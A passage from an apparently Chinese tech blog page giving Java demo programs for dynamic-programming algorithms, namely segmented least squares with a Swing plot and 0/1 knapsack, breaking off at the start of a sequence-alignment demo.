href="#分段最小二乘法" class="headerlink" title="分段最小二乘法"></a>分段最小二乘法</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.awt.*;<br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">import</span> javax.swing.JPanel;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SLMSDemo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">JFrame</span>{<br>    <span class="hljs-comment">//16个点的点集，第一行为横坐标，第二行为纵坐标</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> P[][]={{<span class="hljs-number">20</span>,<span class="hljs-number">40</span>,<span class="hljs-number">50</span>,<span class="hljs-number">60</span>,<span class="hljs-number">70</span>,<span class="hljs-number">80</span>,<span class="hljs-number">90</span>,<span class="hljs-number">100</span>,<span class="hljs-number">110</span>,<span class="hljs-number">120</span>,<span class="hljs-number">130</span>,<span class="hljs-number">140</span>,<span class="hljs-number">150</span>,<span class="hljs-number">160</span>,<span class="hljs-number">170</span>,<span class="hljs-number">180</span>},<br>                {<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">34</span>,<span class="hljs-number">56</span>,<span class="hljs-number">77</span>,<span class="hljs-number">99</span>,<span class="hljs-number">118</span>,<span class="hljs-number">121</span>,<span class="hljs-number">124</span>,<span class="hljs-number">127</span>,<span class="hljs-number">128</span>,<span class="hljs-number">129</span>,<span class="hljs-number">131</span>}};<br>    <span class="hljs-comment">//分段限制参数C，C越大，分的段数越少，可避免过拟合</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-type">double</span> C=<span class="hljs-number">100</span>;<br>    <span class="hljs-comment">//设置一个极大值常量</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> MAXV=<span class="hljs-number">1000000000</span>;<br>    <span class="hljs-comment">//设置最大分段数</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> maxS=<span class="hljs-number">100</span>;<br>    <span class="hljs-comment">//实际分段数</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> mc=<span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//点集共16个点</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> n=<span class="hljs-number">16</span>;<br>    <span class="hljs-comment">//从1到j,j=1,2,...n的最小拟合误差,下标0做初始值，值为0</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-type">double</span>[] optC=<span class="hljs-keyword">new</span> <span class="hljs-title class_">double</span>[n+<span class="hljs-number">1</span>];<br>    <span class="hljs-comment">//每个可能的子集的拟合直线a参数</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-type">double</span>[][] a=<span class="hljs-keyword">new</span> <span class="hljs-title class_">double</span>[n][n];<br>    <span class="hljs-comment">//每个可能的子集的最小乘误差</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-type">double</span>[][] eC=<span class="hljs-keyword">new</span> <span class="hljs-title class_">double</span>[n][n];<br>    <span class="hljs-comment">//每个可能的子集的拟合直线的b参数</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-type">double</span>[][] b=<span class="hljs-keyword">new</span> <span class="hljs-title class_">double</span>[n][n];<br>    <span class="hljs-comment">//最优的分段结果，第一行该子集的第一个点的下标，第二行为该子集的最后一个点的下标</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span>[][] mS=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][maxS];<br>    <span class="hljs-comment">//静态块初始化optC的初始边界值为0</span><br>    <span class="hljs-keyword">static</span> {<br>        optC[<span class="hljs-number">0</span>]=<span class="hljs-number">0</span>;<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SLMSDemo</span><span class="hljs-params">()</span>{}<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {<br>        <span class="hljs-type">SLMSDemo</span> <span class="hljs-variable">frame</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SLMSDemo</span>();<br>        <span class="hljs-comment">//计算a,b,eC</span><br>        ComputeE();<br>        <span class="hljs-comment">//计算每个1...j子集的最优拟合代价</span><br>        mc = ComputeOPT();<br>        <span class="hljs-comment">//显示输出计算结果</span><br>        DrawPanel rd= <span class="hljs-keyword">new</span> <span class="hljs-title class_">DrawPanel</span>(P,a,b,mS,mc);<br>        frame.add(rd);<br>        frame.setSize(<span class="hljs-number">400</span>,<span class="hljs-number">400</span>);<br>        frame.setTitle(<span class="hljs-string">"分段最小二乘演示程序"</span>);<br>        frame.setLocationRelativeTo(<span class="hljs-literal">null</span>);<br>        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);<br>        frame.setVisible(<span class="hljs-literal">true</span>);<br>    }<br><br><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ComputeE</span><span class="hljs-params">()</span> {<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++){<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=j;i++){<br>                <span class="hljs-type">int</span> xySum=<span class="hljs-number">0</span>;<br>                <span class="hljs-type">int</span> xSum=<span class="hljs-number">0</span>;<br>                <span class="hljs-type">int</span> ySum=<span class="hljs-number">0</span>;<br>                <span class="hljs-type">int</span> xxSum=<span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=i;k&lt;=j;k++){<br>                    xySum+=P[<span class="hljs-number">0</span>][k]*P[<span class="hljs-number">1</span>][k];<br>                    xxSum+=P[<span class="hljs-number">0</span>][k]*P[<span class="hljs-number">0</span>][k];<br>                    xSum+=P[<span class="hljs-number">0</span>][k];<br>                    ySum+=P[<span class="hljs-number">1</span>][k];<br>                }<br>                <span class="hljs-type">double</span> zj=((j-i+<span class="hljs-number">1</span>)*xxSum-xSum*xSum);<br>                <span class="hljs-keyword">if</span>(zj!=<span class="hljs-number">0</span>){<br>                    a[i][j]=((j-i+<span class="hljs-number">1</span>)*xySum-xSum*ySum)/zj;<br>                }<span class="hljs-keyword">else</span>{<br>                    a[i][j]=MAXV;<br>                }<br>                b[i][j]=(ySum-a[i][j]*xSum)/(j-i+<span class="hljs-number">1</span>);<br>                <span class="hljs-type">int</span> eSum=<span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=i;k&lt;=j;k++){<br>                    eSum+=(P[<span class="hljs-number">1</span>][k]-P[<span class="hljs-number">0</span>][k]*a[i][j]-b[i][j])*(P[<span class="hljs-number">1</span>][k]-P[<span class="hljs-number">0</span>][k]*a[i][j]-b[i][j]);<br>                }<br>                eC[i][j]=eSum;<br>            }<br>        }<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">ComputeOPT</span><span class="hljs-params">()</span> {<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++){<br>            <span class="hljs-type">double</span> emin=MAXV;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=j;i++){<br>                <span class="hljs-type">double</span> zj=eC[i-<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>]+C+optC[i-<span class="hljs-number">1</span>];<br>                <span class="hljs-keyword">if</span>(zj&lt;emin){<br>                    emin=zj;<br>                }<br>            }<br>            optC[j]=emin;<br>            <span class="hljs-comment">//System.out.println(optC[j]+"");</span><br>        }<br>        <span class="hljs-type">int</span> m=<span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> j=n;<br>        <span class="hljs-keyword">while</span> (j&gt;=<span class="hljs-number">1</span>){<br>            <span class="hljs-type">double</span> emin=MAXV;<br>            <span class="hljs-type">int</span> imin=<span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=j;i++){<br>                <span class="hljs-type">double</span> zj=eC[i-<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>]+C+optC[i-<span class="hljs-number">1</span>];<br>                <span class="hljs-keyword">if</span>(zj&lt;emin){<br>                    emin=zj;<br>                    imin=i;<br>                }<br>            }<br>            mS[<span class="hljs-number">0</span>][m]=imin-<span class="hljs-number">1</span>;<br>            mS[<span class="hljs-number">1</span>][m]=j-<span class="hljs-number">1</span>;<br>            m=m+<span class="hljs-number">1</span>;<br>            j=imin-<span class="hljs-number">1</span>;<br>        }<br>        <span class="hljs-keyword">return</span> m;<br>    }<br>}<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DrawPanel</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">JPanel</span>{<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> widthP=<span class="hljs-number">400</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> tw=<span class="hljs-number">40</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> heightP=widthP-tw;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> width=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> height=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">private</span> Color axisColor=Color.BLACK;<br>    <span class="hljs-keyword">private</span> Color scatColor=Color.BLUE;<br>    <span class="hljs-keyword">private</span> Point origin;<br>    <span class="hljs-keyword">private</span> Point originA;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> cx=<span class="hljs-number">5</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> cy=<span class="hljs-number">5</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> beishu;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> sC=<span class="hljs-number">100</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span>[][] P;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span>[][] a;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span>[][] b;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span>[][] mS;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> mc;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DrawPanel</span><span class="hljs-params">()</span>{<br>        originA=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Point</span>(<span class="hljs-number">2</span>,<span class="hljs-number">380</span>-<span class="hljs-number">2</span>);<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DrawPanel</span><span class="hljs-params">(Point p)</span>{<br>        origin=p;<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DrawPanel</span><span class="hljs-params">(<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y)</span>{<br>        origin=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Point</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>        width=x;<br>        height=y;<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DrawPanel</span><span class="hljs-params">(<span class="hljs-type">int</span>[][]P,<span class="hljs-type">double</span>[][]a,<span class="hljs-type">double</span>[][]b,<span class="hljs-type">int</span>[][]mS,<span class="hljs-type">int</span> mc)</span>{<br>        cx=<span class="hljs-number">5</span>;<br>        cy=<span class="hljs-number">5</span>;<br>        sC=<span class="hljs-number">16</span>;<br>        <span class="hljs-built_in">this</span>.P=P;<br>        <span class="hljs-built_in">this</span>.a=a;<br>        <span class="hljs-built_in">this</span>.b=b;<br>        <span class="hljs-built_in">this</span>.mS=mS;<br>        <span class="hljs-built_in">this</span>.mc=mc;<br>        beishu=<span class="hljs-number">2</span>;<br>        originA=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Point</span>(cx,<span class="hljs-built_in">this</span>.heightP-cy);<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getArea</span><span class="hljs-params">()</span>{<br>        <span class="hljs-keyword">return</span> width*height;<br>    }<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">paintComponent</span><span class="hljs-params">(Graphics g)</span>{<br>        paintXY(g);<br>        paintScatters(g);<br>        paintLines(g);<br>    }<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">paintXY</span><span class="hljs-params">(Graphics g)</span>{<br>        g.setColor(axisColor);<br>        g.drawLine(originA.x,originA.y,originA.x+widthP-cx,originA.y);<br>        g.drawLine(originA.x,originA.y,originA.x,originA.y-heightP+cy+tw);<br>    }<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">paintScatters</span><span class="hljs-params">(Graphics g)</span>{<br>        g.setColor(scatColor);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;sC;i++){<br>            g.drawOval(originA.x+P[<span class="hljs-number">0</span>][i]*beishu,originA.y-P[<span class="hljs-number">1</span>][i]*beishu,cx,cy);<br>        }<br>    }<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">paintLines</span><span class="hljs-params">(Graphics g)</span>{<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;mc;i++){<br>            <span class="hljs-type">int</span> y1=(<span class="hljs-type">int</span>)((a[mS[<span class="hljs-number">0</span>][i]][mS[<span class="hljs-number">1</span>][i]]*P[<span class="hljs-number">0</span>][mS[<span class="hljs-number">0</span>][i]]+b[mS[<span class="hljs-number">0</span>][i]][mS[<span class="hljs-number">1</span>][i]])*beishu);<br>            <span class="hljs-type">int</span> x1=P[<span class="hljs-number">0</span>][mS[<span class="hljs-number">0</span>][i]]*beishu;<br>            <span class="hljs-type">int</span> y2=((<span class="hljs-type">int</span>)(a[mS[<span class="hljs-number">0</span>][i]][mS[<span class="hljs-number">1</span>][i]]*P[<span class="hljs-number">0</span>][mS[<span class="hljs-number">1</span>][i]]+b[mS[<span class="hljs-number">0</span>][i]][mS[<span class="hljs-number">1</span>][i]])*beishu);<br>            <span class="hljs-type">int</span> x2=P[<span class="hljs-number">0</span>][mS[<span class="hljs-number">1</span>][i]]*beishu;<br>            g.setColor(Color.RED);<br>            g.drawLine(originA.x+x1,originA.y-y1,originA.x+x2,originA.y-y2);<br>        }<br>    }<br><br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="背包问题"><a href="#背包问题" class="headerlink" title="背包问题"></a>背包问题</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">KnapsackDemo</span> {<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">W</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;<br>    <span class="hljs-comment">//static int[] iW={6,17,8,21,4,7,8,12,9,11};</span><br>    <span class="hljs-comment">//static int[] iV={7,21,14,23,6,6,9,11,8,14};</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span>[] iW = {<span class="hljs-number">6</span>, <span class="hljs-number">17</span>, <span class="hljs-number">8</span>, <span class="hljs-number">21</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">12</span>, <span class="hljs-number">9</span>, <span class="hljs-number">11</span>};<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span>[] iV = {<span class="hljs-number">7</span>, <span class="hljs-number">21</span>, <span class="hljs-number">14</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">9</span>, <span class="hljs-number">11</span>, <span class="hljs-number">8</span>, <span class="hljs-number">14</span>};<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span>[][] optC = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[n + <span class="hljs-number">1</span>][W + <span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">sN</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">vG</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">wG</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span>[] iS = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[n];<br><br>    <span class="hljs-keyword">static</span> {<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt;= W; j++) {<br>            optC[<span class="hljs-number">0</span>][j] = <span class="hljs-number">0</span>;<br>        }<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {<br>        computeOPT();<br>        System.out.println(<span class="hljs-string">"所选物件编号为"</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; n; i++) {<br>            System.out.print(iS[i] + <span class="hljs-string">" "</span>);<br>        }<br>        System.out.print(<span class="hljs-string">"\n"</span>);<br>        System.out.println(<span class="hljs-string">"占用总空间为: "</span> + wG);<br>        System.out.println(<span class="hljs-string">"总价值为: "</span> + vG);<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">computeOPT</span><span class="hljs-params">()</span> {<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; j &lt;= n; j++) {<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">w</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; w &lt;= W; w++) {<br>                <span class="hljs-keyword">if</span> (w &lt; iW[j - <span class="hljs-number">1</span>]) {<br>                    optC[j][w] = optC[j - <span class="hljs-number">1</span>][w];<br>                } <span class="hljs-keyword">else</span> {<br>                    <span class="hljs-type">int</span> <span class="hljs-variable">zj</span> <span class="hljs-operator">=</span> iV[j - <span class="hljs-number">1</span>] + optC[j - <span class="hljs-number">1</span>][w - iW[j - <span class="hljs-number">1</span>]];<br>                    <span class="hljs-keyword">if</span> (zj &gt; optC[j - <span class="hljs-number">1</span>][w]) {<br>                        optC[j][w] = zj;<br>                    } <span class="hljs-keyword">else</span> {<br>                        optC[j][w] = optC[j - <span class="hljs-number">1</span>][w];<br>                    }<br>                }<br>            }<br>        }<br>        <span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> n;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">w</span> <span class="hljs-operator">=</span> W;<br>        <span class="hljs-keyword">while</span> (j &gt; <span class="hljs-number">0</span>) {<br>            <span class="hljs-keyword">if</span> (w &lt; iW[j - <span class="hljs-number">1</span>]) {<br>                j = j - <span class="hljs-number">1</span>;<br>            } <span class="hljs-keyword">else</span> {<br>                <span class="hljs-type">int</span> <span class="hljs-variable">zj</span> <span class="hljs-operator">=</span> iV[j - <span class="hljs-number">1</span>] + optC[j - <span class="hljs-number">1</span>][w - iW[j - <span class="hljs-number">1</span>]];<br>                <span class="hljs-keyword">if</span> (zj &gt; optC[j - <span class="hljs-number">1</span>][w]) {<br>                    iS[sN] = j;<br>                    sN = sN + <span class="hljs-number">1</span>;<br>                    vG = vG + iV[j - <span class="hljs-number">1</span>];<br>                    wG = wG + iW[j - <span class="hljs-number">1</span>];<br>                    w = w - iW[j - <span class="hljs-number">1</span>];<br>                    j = j - <span class="hljs-number">1</span>;<br>                } <span class="hljs-keyword">else</span> {<br>                    j = j - <span class="hljs-number">1</span>;<br>                }<br>            }<br>        }<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="串匹配"><a href="#串匹配" class="headerlink" title="串匹配"></a>串匹配</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SequenceAlignmentDemo</span> {<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> m=<span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> n=<span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">static</span> String X=<span class="hljs-string">"governance"</span>;<br>    <span 